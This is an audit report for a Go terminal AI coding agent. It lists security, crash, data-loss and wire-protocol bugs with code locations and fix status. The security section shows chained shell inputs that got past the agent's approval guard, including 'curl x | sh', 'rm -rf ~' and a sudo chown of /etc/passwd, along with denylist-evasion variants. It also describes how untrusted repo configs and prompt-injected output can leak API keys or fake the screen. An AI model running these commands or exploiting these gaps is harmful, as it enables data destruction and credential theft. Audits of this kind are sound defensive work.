# Codebase Audit - 2026-10-17

Commit audited: `fdfb8fd` (main, after #47 sudo pre-authentication).

## Method

1. Six analysis agents audited separate areas: agent/session/main, guard/tools, llm/config, TUI state, TUI rendering, and docs/dependencies/CI.
2. Six fresh verifier agents re-checked every claim independently. They received only the claims, not the original evidence.
3. Most bugs were proven with throwaway reproducer tests (deleted afterwards). Reproducer output is quoted where useful.
4. Baseline at the time of the audit: `go build`, `go vet`, `go test ./gohome/...` and `golangci-lint` all pass. None of the bugs below is caught by the current test suite.

Verdicts:
- **Confirmed**: both rounds agree, usually with a reproducer.
- **Partly confirmed**: the mechanism is real, but the verifier corrected the severity or details. The correction is noted.

No claim was refuted.

Severity is the verifier's corrected severity.

This report replaces these earlier documents, which are archived locally in `docs/old/`:
- `docs/reviews/2026-08-21-goal-items.md`
- `docs/reviews/2026-09-15-code-review-findings.md`
- `docs/performance-findings.md`
- `docs/plans/*`
- `docs/windows-defender.md`

Section 8 records the status of their items.

---

## 1. Security

### S1. Critical - Whitelist patterns are only anchored at the start, so whitelisted commands can be chained
- **Location:** `guard/compile.go:44-47`, `:75`
- **Problem:** Patterns get a leading `^` but no end anchor. Shell operators are not handled.
- **Evidence:** With `git status` and `ls` whitelisted, these were all allowed without a prompt:
  - `git status; curl x | sh`
  - `git status\nrm -rf ~`
  - `git status $(id)`
  - `lsof; id`
  - `ls && id`
- **Status:** Prior M1. Fixed on branch `fix/security-fixes`. Commands with shell operators never auto-approve, patterns must match whole words, and alternations stay anchored.

### S2. High - Project files in an untrusted repo control the guard and the LLM endpoint
- **Whitelist:** `main.go:283` loads `./.gohome/whitelist.json` with no trust check. A cloned repo can ship `{"shell":[".*"]}` and pre-approve every command.
- **Model config:** `config/config.go:106-112` lets project `modelConfig` entries fully replace global entries, and lets the project `defaultModel` win.
  - A repo can define a model with its own `baseURL` and `apiKeyEnv: "ANTHROPIC_API_KEY"`. The user's key is then sent to that server on the first message.
  - It can also replace `systemPrompt` and turn on `cacheSudoPassword` (`config.go:140`).
- **Denylist:** a project `.gohome/denylist.json` of `{"shell":[]}` with no global file removes the built-in defaults (`guard/load_denylist.go:24-26`).
- **Found by:** guard verifier and llm verifier independently. Confirmed by direct code reading.

#### Drop S2. This is not an issue.

### S3. High - "Allow always" can whitelist everything, or all of sudo
- **Empty pattern:** `tui/model_approval.go:72` saves `patternInput.Value()` without validation. `guard/persist.go:28-31` turns `""` into `^`, which matches every command. The `^` pattern survives reload. (Prior M2, still open.)
- **Sudo suggestion:** `guard/suggest.go:67-68` suggests `^sudo` for `sudo apt install x`.
- **No regex escaping:** `guard/suggest.go:43-44` does not escape suggestions.
  - `^./build.sh` also matches `./build.shred`.
  - `^c++` is an invalid regex. It is skipped in memory but still written to the file, so the user thinks it is whitelisted.
- **Deduplication mismatch:** in memory, deduplication compares the anchored form. In the file it compares the raw string, so `^ls` and `ls` are both written.

#### Need more info on S3 before deciding if this is worth fixing.
- **Status:** Fixed on branch `fix/security-fixes`. Empty and invalid patterns are rejected, suggestions are escaped, sudo suggestions are the full command ending in `$`, and patterns are stored in one anchored form.

### S4. High - A whitelisted prefix plus sudo runs as root with only a password prompt, or no prompt at all
- **Location:** `guard/check.go:67-72`
- **Problem:** A whitelisted command that contains sudo gets a password-only prompt.
- **Evidence:** `git status; sudo chown nobody /etc/passwd` returned `allow=true reason=whitelisted passwordOnly=true`.
- **With `cacheSudoPassword` on:** `tui/model_approval.go:269-275` (`replyFromCache`) answers the prompt with no user input.
- **Without the cache:** the password dialog shows only 3 lines of the command (`tui/approval.go:201`, `maxCmdLines = 3`).
- **Status:** Fixed on branch `fix/security-fixes`. Chained commands are no longer whitelisted (S1), and Tab expands the full command in the password dialog.

### S5. High - Terminal escape sequences are not sanitized
- **Problem:** No sanitizer exists in tui, tools or agent. Tool output, LLM text and file contents shown in diffs (`tui/diff.go:28`) reach the terminal with raw ESC sequences.
- **Evidence:** OSC 52 (clipboard write) and CSI 2J (clear screen) appeared verbatim in `Model.View()`.
- **Why the renderer does not help:** Bubble Tea's `ansi.Truncate` keeps escape sequences.
- **Impact:** a hostile file or a prompt-injected reply can write the user's clipboard, or clear and redraw the screen to fake output.
- **Status:** Fixed on branch `fix/security-fixes`. Agent text, tool output, tool names, diffs and resumed history are sanitized. The approval prompt shows control characters as `\xNN` with a warning.

### S6. Medium - Secrets are written world-readable, and save errors are hidden
- `tui/config_wizard.go:222` writes `settings.json`, including a literal `apiKey`, with mode `0644`. Directories are created `0755`.
- `config/skeleton.go:69,72` and `scaffoldDenylist` (`config_wizard.go:242`) do the same.
- Save errors are swallowed and the wizard moves on.
- **Status:** Fixed on branch `fix/security-fixes`. New files are `0600`, new folders `0700`, and save errors keep the wizard on the current step.

### S7. Medium - The denylist is easy to bypass
- **Location:** `guard/denylist.go:67-70` uses plain substring matching.
- **Not denied:** `rm -r -f /`, `rm -rf "/"`, `rm  -rf /`, `rm -fr /`, `rm -rf ~`.
- **False positives:** `rm -rf /tmp/build` and `echo mkfs` are denied.
- **Scope gap:** write and edit are never checked (`denylist.go:56`).
- **Status:** Prior L13. Fixed on branch `fix/security-fixes` for new setups: regex defaults handle flag order, quotes and `~`, and spaces are squeezed before matching. Write and edit are still not checked (out of scope).

### S8. Low - The whitelist file rewrite is not atomic
- `guard/persist.go:105-114` truncates the file, then writes it.
- `guard/load_whitelist.go:27` reads without the lock.
- A torn read is treated as an empty whitelist. That means more prompts, not fewer, so it does not weaken security.

#### Skip this. S8 not an issue.

---

## 2. Hangs and crashes

### H1. High - Shell tool deadlocks when an output line exceeds 1 MiB
- **Location:** `tools/shell.go:166-175`, `:192-193`
- **Cause:**
  1. The scanner stops on `ErrTooLong`.
  2. Nothing reads the `io.Pipe` any more, so exec's copy goroutine blocks.
  3. `cmd.Wait` never returns.
- **Effect:** neither the timeout nor Ctrl+C stops it.
- **Evidence:** a 2 MB single-line output with `timeout_ms=1000` was still running after 20 s.

### H2. High - Shell timeout does not kill child processes
- **Location:** `tools/shell.go:139` uses `exec.CommandContext`, which kills only `/bin/sh`. There is no `cmd.Cancel` for the process group and no `WaitDelay`.
- **Evidence:**
  - `sleep 4; echo done` with a 300 ms timeout took 4.03 s.
  - `sleep 30 & echo bg` blocked until the background job exited, and the job was orphaned.
- **Fix hint:** `Setsid` is already set (`shell_unix.go:14`), so `kill(-pid)` in `cmd.Cancel` plus a `WaitDelay` is enough.
- **Status:** Prior M3, still open.
- **Related:** on timeout, output already captured is discarded (`shell.go:197-202`).

### H3. High - `WrapText` loops forever on width 0 or less
- **Location:** `tui/ansi.go:211-252`
- **Problem:** When `remaining <= 0`, it is reset to `maxWidth` (still 0 or less). `takeWidth` then returns `""`, so the loop never progresses.
- **Callers:** they subtract fixed offsets (`chat.go:446,477,495,543`) with no clamp.
- **Terminal widths at which `View()` hangs:**

  | Entry type | Hangs at width |
  |---|---|
  | User entry | 4 or less |
  | Tool with a result preview | 9 or less |
  | Subagent preview | 15 or less |
  | Any entry with CJK text | about 1 more column than above |

- **Adversarial input:** each nested `>` quote level costs 2 columns, so about 40 levels hang at width 80.
- **Why offscreen entries matter:** pass 1 of `Chat.Render` renders every entry, including offscreen ones.
- **Effect:** the event loop freezes and Ctrl+C cannot be processed.

### H4. Medium - Horizontal rule panics on negative width
- **Location:** `tui/markdown.go:126`, `strings.Repeat("─", width)`
- **Triggers:**
  - `---` at width 1
  - `> > > > ---` at width 9 or less
  - deep nesting at any width
- **Effect:** Bubble Tea catches the panic and the app exits.

### H5. Medium-High - Cancelling the setup wizard leaves a nil client
- **Location:** `main.go:252` (`var client common.Client`). Wizard cancel only clears the modal (`tui/model.go:290`). The save-failure paths return silently.
- **Effect:** the first message calls `Stream` on a nil interface at `agent/turn.go:37`. There is no recover there, so the process crashes.
- **Status:** Prior M9, still open.

---

## 3. Data loss and broken sessions

### D1. High - Sessions with a JSONL line over 64 KiB cannot be loaded or listed
- **Location:** `session/load.go:35` and `session/list.go:75` use `bufio.Scanner` with the default 64 KiB limit.
- **Why lines get that long:** tool results are uncapped, and the `Compaction` event stores the whole history on one line.
- **Evidence:** a 70 KiB tool result gave `Load err: bufio.Scanner: token too long` and `List: 0 listings, err=<nil>`.
- **Effect:**
  - `--resume` (`main.go:85-100`) silently opens an older session.
  - The session also disappears from `/resume`.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Session files are read with `bufio.Reader`, so long lines load and list. Skipped files are logged.

### D2. High - Subagent session IDs collide, and `--resume` picks the child
- **Location:** `agent/spawn.go:32,53`
- **Problem:** IDs are `sub-N` from a per-process counter, so files from different runs on the same day are both named `<date>-sub-1.jsonl`. They are opened in append mode and `Load` merges both histories.
- **Evidence:** one file contained 2 `session_start` lines and a replayed history of length 4.
- **Resume problem:**
  - `session/list.go:53-55` does not filter on `Depth` and sorts by `StartedAt`.
  - A child always starts after its parent, so `--resume` loads the child. The child then cannot spawn subagents.
  - `/resume` matches by ID, so it can load the wrong `sub-1` file.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Child IDs are `<parentID>-sub-N`. Children are hidden from resume lists and load as read-only views when the parent is resumed.

### D3. Medium-High - Tool results skipped by a steer are not saved
- **Location:** `agent/run.go:104-112` adds `skipped: user steered` in memory, then hits `continue` before `w.Emit(ToolResult)` and before `EventToolResult`.
- **Effect:**
  - After resume, the history has a `tool_use` with no `tool_result`, and the API returns 400.
  - In the TUI the skipped tool entries stay "pending".
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Steer-skipped results are saved to JSONL and shown in the TUI. A `tool_use` with no result is repaired on load.

### D4. High - Invalid tool-call JSON breaks every later Anthropic request
- **Location:** `anthropic/request.go:156-167` uses `json.RawMessage(b.InputJSON)`. Nothing in `agent/turn.go:87-93` or `run.go:211` validates it.
- **Evidence:** `json: error calling MarshalJSON for type json.RawMessage: unexpected end of JSON input`
- **Realistic trigger:** `max_tokens` cuts off a tool_use. The stop reason is never checked (`run.go:39` discards it).
- **Why it persists:** compaction keeps the last 4 messages unchanged, so it does not repair the history.
- **Scope:** the OpenAI wire is not affected.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Prior M6. `Turn` stores invalid input as `{}` and marks the call; `Run` returns an error result without running it. The Anthropic request builder sends `{}` for invalid stored input.

### D5. Medium - Streams that end early are treated as complete
- **OpenAI** (`openai/translate.go:139-150`): EOF without `[DONE]` emits a truncated tool call as complete. Evidence: `args="{\"command\": \"rm -rf build"`, followed by `turn_done`.
- **Anthropic:** EOF without `message_stop` ends with no error. `agent/turn.go:58-60` treats it as done.
- **Stop reason:** `max_tokens` and `length` are never acted on.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Anthropic EOF without `message_stop`, OpenAI EOF without `[DONE]` and without `finish_reason`, and `Turn` with no `TurnDone` are errors. `max_tokens` and `length` show a notice.

### D6. Medium - Compacting a resumed session can orphan tool results
- **Root cause:** `session/load.go:99-118` replays each tool result as its own message, while the live loop groups them into one (`run.go:150-153`).
- **Problem:** `compact.go:87-89` steps back only one message.
- **Evidence:** history from a turn with 2 parallel tool calls compacted to `[u, a, summary, tool(tu1), tool(tu2), ...]`, which the API rejects with a 400.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Replayed tool results are grouped into one message, and compaction steps back over every `RoleTool` message.

### D7. Medium - Cancelling during compaction saves a cut-off summary
- **Location:** `agent/compact.go:133-147`
- **Problem:** `for ev := range events` ends on channel close with no error.
- **Evidence:** `err=<nil>`, and History[2] became `"[Auto-compact summary]\n\npartial"`. This is persisted as a `Compaction` event.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. `compact` applies the summary only after `EventTurnDone` with no context error.

### D8. Low-Medium - Session write errors are dropped
- **Location:** `session/writer.go:71-75`
- **Problem:** `Write` and `Sync` errors are discarded, and events that fail to encode are skipped.
- **Effect:** a full disk loses history with no warning.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. `Writer.Err()` reports write errors and the TUI shows "session not saved".

### D9. Low - Emit after Close panics
- **Location:** `session/writer.go:39-41`
- **Problem:** `w.ch <- ev` on a closed channel panics.
- **When:** only a narrow race in `runLoop` (`main.go:120-130`). The writer is fetched before `MarkBusy`, and an immediate `/new` swap can close it in between.
- **Status:** Fixed on branch `fix/data-loss-d1-d9`. Prior M15. `Emit` after `Close` drops the event instead of panicking.

---

## 4. Agent loop and TUI control flow

### A1. High - HTTP errors are never shown in the TUI
- **Location:** `agent/turn.go:37-39` returns the `Stream` error without emitting `EventError`. `main.go:152-153` only logs it.
- **Effect:** the TUI only renders `EventError` (`model_agent.go:224`). A 401, 400, 5xx or a refused connection just stops the spinner.
- **Scope:** headless mode prints the error. In the TUI, subagent errors still appear because they come back as tool results.
- **Related:** after a failed run, the user message stays in history with no reply.
- **Status:** Partly fixed (#49): stream errors and a nil client now emit `EventError`. The unanswered user message after a failed run remains (FOLLOWUP_TASKS).

### A2. Medium - Work continues after cancel
- **Location:** `agent/run.go:97-146` has no `ctx.Err()` check between tool calls.
- **Effect:**
  - Remaining yolo or whitelisted write/edit calls in the batch still run.
  - Calls that need approval still send prompts (`tui/frontend.go:89-90` sends before checking ctx).
  - `cancelFocusedSessionWith` (`tui/model.go:383-404`) does not clear `activeApproval` or `approvalQueue`.
- **Evidence:**
  - `Run err=context canceled; write_like executed after cancel: true`
  - Answering a stale prompt gives `spinner=true inFlight=false`.
- **Status:** Prior L6, worse than first reported. Fixed on branch `fix/agent-loop-a2-a10`. `Run` checks the context between tool calls and after compaction, no approval prompt is sent after cancel, and cancel denies and clears active and queued approvals.

### A3. Low - A cancelled turn is sometimes treated as success
- **Location:** `agent/turn.go:51-60`
- **Problem:** the stream channel closes on cancel without an error. If `Turn` is busy when the cancel lands, the close wins. Partial text is then persisted and `Run` returns nil.
- **Verifier correction:** this happened 0/40 times with a fast `Emit` and 7/20 with a 300 ms `Emit`. It is not about 50%.
- **Status:** Fixed by D5. `Turn` returns `ctx.Err()` when the stream closes after a cancel.

### A4. Medium - Steering, queue and session-swap routing
- **Steer taken by the subagent:** the child shares the parent's `SteerCh` (`agent/spawn.go:83`). A steer typed in the parent view goes into the child's history, while the TUI shows it in the parent.
- **Queue drained into a child:** `tui/model_agent.go:175-187` drains the global queue on the focused child's `EventRunDone`. The message is shown in the child timeline but runs as the next main turn.
- **Queue stuck:** if focus moves away before main's `RunDone`, queued messages stay until a later `RunDone`.
- **Session switch dropped:** `/new` or `/resume` during a run focuses the new session right away (`model_slash.go:72-81`).
  - Esc then calls `CancelSession`, which runs `ClearPending()` (`main.go:730`) and drops the switch.
  - A run ending in `ErrToolDenied` hits `continue` (`main.go:148-150`) and skips `DrainPending`.
  - Either way, the next message goes to the old session while the TUI shows the new one.
  - The `Swap` comment in `state.go:58-60` ("queued returns true") is stale.
- **Wrong session cancelled:** `CancelSession` ignores `id` (`main.go:723`). Esc while a child is focused cancels the main run, but only the child is marked cancelled.
- **Spinner stopped early:** a child's `RunDone` stops the global spinner while the parent is still running (`model_agent.go:259-262`).
- **Late `RunDone`:** a `RunDone` from a cancelled run clears `InFlight` for the next run. Events carry no run ID.
- **Status:** Fixed on branch `fix/agent-loop-a2-a10`. Children get no steer channel. Cancel targets the main run. Only the main session's `RunDone` stops the spinner and drains the queue. Active runs are counted, so a late `RunDone` is ignored. `/new` and `/resume` are refused during a run.

### A5. Medium - Data races on `/model`
- **Location:** `agent/turn.go:27` reads `sess.Model` while `SessionState.SetModel` (`state.go:118`) writes it. Confirmed with `-race`.
- **Also:** `main.go:711-713,776-778` write `a.MaxTokens`, `ThinkingBudget` and `ReasoningEffort` with no lock.
- **Missing defaults:** these writes skip the startup defaults. After a switch, a config without `maxTokens` gets 4096 (`turn.go:22`) instead of 16384, and thinking turns off.
- **Status:** Prior M7. Fixed on branch `fix/agent-loop-a2-a10`. Model settings live in `SessionState` behind the lock, and one helper applies a model config with defaults.

### A6. Medium - Resume keeps the old model name
- `--resume` and `/resume` keep `sess.Model` from the JSONL while using the current client.
- `turn.go:27` sends the old name to the new endpoint.
- **Status:** Prior M8. Fixed on branch `fix/agent-loop-a2-a10`. A resumed session uses the current model config. The JSONL `SessionStart` record keeps the old name (FOLLOWUP_TASKS).

### A7. Medium - Input handling
- **Esc in the file popup cancels the run:** Esc in the `@` file-search popup cancels the whole run while the spinner is active (`model_keys.go:63-66` runs before `:196-199`).
- **Text starting with `/` is lost:** any input starting with `/` is treated as a slash command (`model_keys.go:122-124`). `/usr/bin/python3 crashes, why?` becomes "unknown command" and the editor is cleared.
- **Arrow Down does not resume auto-scroll:** moving back to the last entry with the Down arrow does not turn following back on (`model_keys.go:230-243`, `chat.go` `EnsureCursorVisible`). Wheel and PgDown do.
- **Prompt history is dead:** Enter is handled in `model_keys.go:104` and never calls `editor.Submit()`, so `History.Add` never runs.
  - Latent panic: `history.go:47-50` returns `entries[pos]` with `pos == -1` if Submit is ever wired in.
  - Up on the first row of a draft jumps the cursor to the end (`editor.go:456-463`).
- **`/cancel` when idle:** it still adds "Cancelled." (`model_slash.go:69-70`).
- **Status:** Fixed on branch `fix/agent-loop-a2-a10`. Esc closes the file popup first, and cancelling a run needs a double Esc. Only known commands are slash commands. Arrow Down resumes auto-scroll. Prompt history is wired to Ctrl+P / Ctrl+N. `/cancel` when idle shows "Nothing to cancel".

### A8. Medium - The long approval prompt is still not fully viewable
- **Location:** `approval.go:138-139`
- **Problem:** after `v` expands the prompt, every line is drawn with no height cap or scroll offset. Bubble Tea keeps only the last `height` lines of the frame.
- **Evidence:** a 42-line command at 80x20 gave `LINE_00 visible=false`. PgUp only moves the chat area.
- **Status:** Fixed on branch `fix/agent-loop-a2-a10`. The expanded prompt has a height cap and PgUp/PgDn scroll.

### A9. Low - Sudo password handling edge cases
- **Locale:** a wrong cached password is only detected by English sudo messages (`model_approval.go:189-192`). `tools.SudoPreauthFailedMarker` (`tools/shell.go:64`) is not used.
- **Windows:** the sudo dialog appears, but the password is ignored (`guard/check.go:57` vs `tools/shell.go:125`).
- **Yolo mode:** returns Allow before any sudo handling (`check.go:52-54`), so sudo fails with no tty.
- **Missed forms:** sudo detection misses `FOO=1 sudo`, `command sudo`, `exec sudo`, `nice sudo`, `/usr/bin/sudo` and `\sudo`. It wrongly matches `echo 'a; sudo b'` (`guard/sudo.go:9-12`). This is a usability issue, not a guard bypass.
- **Line continuation:** a command ending in `\` swallows the wrapper's `exit $?` line (`tools/shell.go:75-76`).
- **Status:** Fixed on branch `fix/agent-loop-a2-a10`. The wrong-password check looks for both the marker and sudo's English text. No sudo dialog on Windows. Sudo in yolo asks for the password. More sudo forms are detected, and a trailing `\` no longer swallows `exit $?`. Left open: the quoted-string false positive, and no height cap on the password dialog's expanded view (FOLLOWUP_TASKS).

### A10. Medium - Headless mode
- **Subagent text in stdout:** `headless/frontend.go:67,80-82` ignores the session ID, so subagent text and all intermediate turns end up in stdout. (Prior L11, now worse.)
- **Ctrl+C ignored:** `--prompt -` ignores Ctrl+C while reading stdin (`frontend.go:85-86`). (Prior M13.)
- **Long lines:** stdin lines over 64 KiB end the session (`frontend.go:43`).
- **Status:** Fixed on branch `fix/agent-loop-a2-a10`. Headless prints only the final main-session reply, Ctrl+C works while reading stdin, and long stdin lines work.
---

## 5. LLM wire and config

### L1. High - Anthropic thinking cannot be disabled, and `budget_tokens` is rejected by current models
- **Location:** `main.go:384-387` and `:577-580` replace a budget of 0 or less with 10240. `anthropic/request.go:99-104` always sends `{type:"enabled", budget_tokens:N}`.
- **Missing:** there is no adaptive mode and no check that the budget is below `max_tokens`. A `maxTokens` of 10240 or less returns 400.
- **API behaviour** (claude-api skill reference, cached 2026-09-25):
  - Rejected with 400: Fable 5/5.1, Sonnet 5/5.5, Opus 5/5.5/4.8/4.7
  - Deprecated: Opus 4.6, Sonnet 4.6
  - Required: Haiku 4.5
- **Related:** `agent/turn.go:129` drops thinking blocks with empty text, which also drops their signature. This is latent until adaptive or omitted-display thinking is used.
- **Status:** Fixed on branch `fix/llm-wire-configs`. Per-model `thinking` mode (`off`, `adaptive`, `budget`). Unset means `budget` if `thinkingBudget > 0`, otherwise `adaptive`. `reasoningEffort` is sent as `output_config.effort`. The budget is checked at startup and on `/model`.

### L2. Medium - Multiple thinking blocks are merged under one signature
- **Location:** `agent/turn.go:73,81,129`
- **Problem:** thinking text is concatenated, only the last signature is kept, and thinking is moved to the front.
- **Verifier correction:** most of this is unreachable today, because only `budget_tokens` mode is used. It becomes High with adaptive or interleaved thinking.
- **Status:** Fixed on branch `fix/llm-wire-configs`. Content blocks keep arrival order, and each thinking block keeps its own signature. Signature-only blocks are kept.

### L3. Medium - `redacted_thinking` blocks are dropped
- **Location:** `anthropic/translate.go:128-134,174-196`
- **Problem:** there is no case at `content_block_stop` and no `data` field.
- **Status:** Fixed on branch `fix/llm-wire-configs`. `redacted_thinking` blocks are read, saved and sent back.

### L4. Medium - Retry and timeouts
- **No 4xx retries:** `common/retry.go:55-58` never retries 4xx, so 429, 408 and 409 are not retried. `Retry-After` is ignored and there is no jitter. (Prior M14.)
- **Unbounded reads:** error bodies are read with no size limit (`retry.go:62`, `stream.go:35`).
- **Mid-stream errors:** a mid-stream Anthropic `overloaded_error` is not retried.
- **No timeouts:** `anthropic/client.go:34` and `openai/client.go:32` use `&http.Client{}`, with no response-header timeout or idle-read watchdog. (Prior M12.) A plain `Client.Timeout` would be the wrong fix, because it would cut off long streams.
- **Status:** Partly fixed on branch `fix/llm-wire-configs`. 408, 409, 429, 5xx and connection errors are retried with `Retry-After` (capped at 60 s) and jitter. Error bodies are capped at 64 KiB. There is a 5-minute response-header timeout and a 5-minute idle-read watchdog, with no total client timeout. The mid-stream `overloaded_error` retry is in FOLLOWUP_TASKS.

### L5. Medium - OpenAI in-stream error chunks are ignored
- **Location:** `openai/translate.go:171-189`
- **Problem:** `data: {"error":{...}}` has no matching field, so the turn ends normally.
- **Evidence:** `text_delta "Hel"`, then `turn_done err=<nil>`.
- **Status:** Fixed on branch `fix/llm-wire-configs`. In-stream error chunks become errors.

### L6. High - The config skeleton writes placeholder values into real settings
- **Location:** `config/skeleton.go:12-43,63-72`, reached from `tui/config_editor.go:20`
- **Problem:** the file is written before the editor opens, with `"defaultModel": "string"`, `"systemPrompt": "string"` and a model `example` with `wire: "string"`.
- **Effect:** on the next launch, `main.go:252-261` cannot find model `string` and exits.
- **Status:** Fixed on branch `fix/llm-wire-configs`. The skeleton has no `example` model and no `"string"` values.

### L7. Medium - Config loading and merging
- **Invalid JSON hidden:** invalid JSON is logged and treated as empty, so `Load` never returns an error (`config.go:63-76`). With 0 model configs the wizard runs and overwrites global `settings.json` (`config_wizard.go:208-222`, prior M10). One trailing comma can lose every model config.
- **Booleans cannot be turned off:** a project file cannot set `autoCompact` or `cacheSudoPassword` to false when global sets them to true (`config.go:137-142`).
- **Dead settings:**
  - `retryBackoffMs` is loaded and shown, but the clients hardcode `common.DefaultBackoff`. `config.DefaultRetryBackoff` is unused.
  - `autoCompactTargetPct` is never read.
- **Status:** Fixed on branch `fix/llm-wire-configs`. Invalid JSON is a load error and gohome exits with the file path. A project file can set `autoCompact` and `cacheSudoPassword` to false. `retryBackoffMs` is wired into the clients. `autoCompactTargetPct` is removed.

### L8. Low - OpenAI wire details
- `max_tokens` is always sent (`openai/request.go:74`). OpenAI reasoning models expect `max_completion_tokens`. This is from training knowledge, not checked against live docs.
- Only `reasoning_content` is read, not `delta.reasoning` (`translate.go:17`).
- A new tool-call id at an index already in use concatenates arguments (`translate.go:228-242`). Seen only from servers that do not follow the spec.
- A thinking-only assistant turn is sent as `content: null` with no tool_calls (`request.go:183-192`).
- Multiple user text blocks are joined with no separator (`request.go:151`).
- **Status:** Partly fixed on branch `fix/llm-wire-configs`. `delta.reasoning` is read, a thinking-only assistant turn sends `content: ""`, and user text blocks are joined with a newline. `max_completion_tokens` and tool-call id reuse are in FOLLOWUP_TASKS.

### L9. Low - Smaller issues
- Compaction ignores cache read/creation tokens (`agent/compact.go:28`). This has no effect until caching is added. (Prior M11.)
- No `cache_control` exists anywhere, and the system prompt is a plain string (`anthropic/request.go:61`).
- SSE parsing: bare-CR line endings and multi-line OpenAI `data:` payloads are not handled. Both are rare.
- **Status:** Partly fixed on branch `fix/llm-wire-configs`. Compaction counts cache-read and cache-write tokens. Prompt caching (`cache_control`) and bare-CR and multi-line SSE parsing are in FOLLOWUP_TASKS.

---

## 6. Tools

### T1. Medium - Output is never truncated
- **Shell** (`tools/shell.go:170`): a 50 MB output was returned in full and stored in history unchanged (`run.go:143`).
- **Read:** capped at 2000 lines but has no byte cap. It also fails on lines over 1 MiB (`read.go:64`).

### T2. Medium - Edit tool bugs
- **Empty `old_string`:** with `replace_all`, "abc" became "XaXbXcX" (`edit.go:61,77`). Without `replace_all`, an empty file also accepts an empty `old_string`.
- **CRLF files:** read removes `\r` (`read.go:63,77`), so multi-line edits on CRLF files always fail.
- **Permissions:** edit always writes with mode `0644`, ignoring the file's original permissions (`edit.go:82`).

### T3. Low - Shell parameters and description
- `timeout_ms` of 0 or less times out immediately (`shell.go:113-118`).
- The tool description hard-codes 120000/600000 ms, although both are configurable (`shell.go:31,37,47`).
- The shell `cwd` is resolved relative to the process directory, not the session (prior L14).
- Read-before-edit compares raw path strings (`session/session.go:53-66`, prior L3).

---

## 7. TUI rendering

All in `gohome/internal/tui/`.

| ID | Sev | Location | Issue |
|---|---|---|---|
| R1 | Medium | ansi.go:150-156,194-203,273-283 | SGR styling is lost or leaks at wrap points. Only the last SGR is tracked, and resets inside dropped spaces are lost. |
| R2 | Medium | markdown.go:332-333 | Raw HTML is skipped: `Vec<String>` renders as `Vec`, and HTML blocks vanish. |
| R3 | Medium | markdown.go:67-109,179,194,203-270 | Code blocks, headings and tables are not wrapped to the screen width and are cut off. Nested lists are indented twice. |
| R4 | Low/Medium | ansi.go:95 | `\r` reaches the terminal, so CRLF output and progress bars blank or overwrite lines. |
| R5 | Medium (Windows) | editor.go:431 | Multi-line paste on Windows submits only the first line. Bubble Tea v1.3.10's console input path (`key_windows.go:25-55`) never sets `Paste`. Verified from source only. |
| R6 | Low | chat.go:612-616,640 | Diff coloring uses `strings.Contains("  - ")`, so context lines are colored as removed. |
| R7 | Low | filesearch.go:50-55,99-102 | The file-search selection can move past the 10 visible rows. |
| R8 | Low | filesearch.go:136-154 | File search results are capped at 50 before scoring and match only basenames. The `find` fallback ignores `.gitignore` and lists `.git/`. Queries starting with `-` are passed to fd as flags. The `cancel` field is never assigned (prior L14). |
| R9 | Low | editor.go:76,169,500-552 | The editor works per rune, not per grapheme, so ZWJ emoji are split. |
| R10 | Low | ansi.go:12 | The ANSI regex misses private CSI, BEL-terminated OSC and charset selection, so these are counted as visible width. |
| R11 | Low | chat.go:512,560,697 | Tabs count as 0 width when wrapping. `expandTabs` counts bytes, not columns. |
| R12 | Low | ansi.go:211 | Zero-width-only tokens are dropped. |
| R13 | Low | markdown.go:68-76,308 | Heading style is cut off after inline emphasis. |
| R14 | Low | chat.go:768-810 | A collapsed multi-line shell command spans several lines. |
| R15 | Low | chat.go:740-754 | `extractToolArg` uses `file_path` and `prompt`, but the schemas use `path` and `task` (prior L1). |
| R16 | Low | selectlist.go:157, config_wizard.go:296 | Backspace removes one byte, not one character (prior L7). |
| R17 | Low | selectlist.go:163-165 | In the session browser, `d` with an empty query starts delete instead of filtering. |
| R18 | Low | model_keys.go:183 | Ctrl+E shadows the editor's end-of-line binding (prior L8). |
| R19 | Low | model_slash.go:128-131 | `/resume` can delete the active session. The error is ignored and "Deleted" is always shown (prior L5). |
| R20 | Low | config_overlay.go | The config overlay has no clipping or scrolling. |
| R21 | Low (perf) | markdown.go:384-398 | The highlight cache churns while a code block streams, and `clear()` at 256 entries drops finished blocks. |
| R22 | Low (perf) | chat.go:457, ansi.go | Streaming re-parses the whole entry on every frame, and `WrapText` uses regex heavily (prior P5, P6). |
| R23 | Low (perf) | model.go:458-476,727-733 | Wheel events are not throttled, and each wheel notch creates its own timer (prior P7, P8). |

### Dead code and stale comments
- **Unused code:**
  - `paste.go:8-25` is used only by tests.
  - Five unused fields in `style/style.go`.
  - `ansi.go:137-144` (`flushCur`).
  - `config_overlay.go` `maxH` and `SetMaxH`.
  - `compact.go:91-94` cannot be reached.
- **Stale comments:**
  - `tokens_overlay.go:31` refers to a function that does not exist.
  - `chat.go:94-95` says ScrollDown re-enables auto-scroll. It does not.
  - `chat.go:313-315` is misleading.
  - `session/load.go:17-24` does not mention compaction events.
  - `spawn.go:18-19` and `turn.go:16` refer to `a.Writer`.
  - `main.go:740` says shutdown takes "~1s", which is not guaranteed.
  - `list.go:23` says "resumable" but includes subagent sessions.
- **README mismatch:** the README says Enter expands thinking entries. `chat.go:472-485` never reads `Expanded` for them.

---

## 8. Outdated components

### Toolchain and dependencies
- **Go 1.25 is no longer supported** (go.mod, `gohome-ci.yml:19,36,74`, `release.yml:33`). Current releases are go1.27.2 and go1.26.9.
  - GO-2026-6617 has no 1.25 fix. It is an HTTP/2 server issue, so gohome reaches it by symbol only.
  - The v0.4.4-dev1 release asset was built with go1.25.14.
- **govulncheck** (local go1.26.4) reports 15 reachable stdlib vulnerabilities, fixed in go1.26.5 to 1.26.9. Example path: `common/retry.go:45` to `http.Client.Do`.
- **`golang.org/x/sys` v0.38.0** has GO-2026-5024 (Windows, not called), fixed in v0.44.0. The latest is v0.49.0.
- **Direct dependencies:**
  - chroma v2.26.1 to v2.27.0
  - goldmark v1.8.2 to v1.8.6
  - `x/exp/golden` has v0.1.0
  - `teatest` pseudo-version is behind
- **Bubble Tea, Lip Gloss and Bubbles v2** exist at `charm.land/...`. Moving to them is a migration.
- **`go mod tidy -diff`** is clean.

### CI and release
